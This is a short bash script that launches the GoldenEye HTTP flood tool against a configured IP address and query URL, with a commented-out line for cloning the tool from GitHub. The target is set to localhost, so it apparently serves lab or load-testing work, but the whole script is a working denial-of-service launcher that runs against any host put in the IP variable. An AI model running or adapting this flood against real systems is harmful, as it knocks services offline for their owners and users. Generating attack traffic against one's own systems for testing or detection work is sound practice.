#!/bin/bash
IP="127.0.0.1"
ID="2"
# Remove clone, now pull from local
# git clone https://github.com/jseidl/GoldenEye.git

echo "Executing HTTP Flood ..."
flood () {
  python3 ./GoldenEye/goldeneye.py "http://$IP?action=get&id=$ID"
}

flood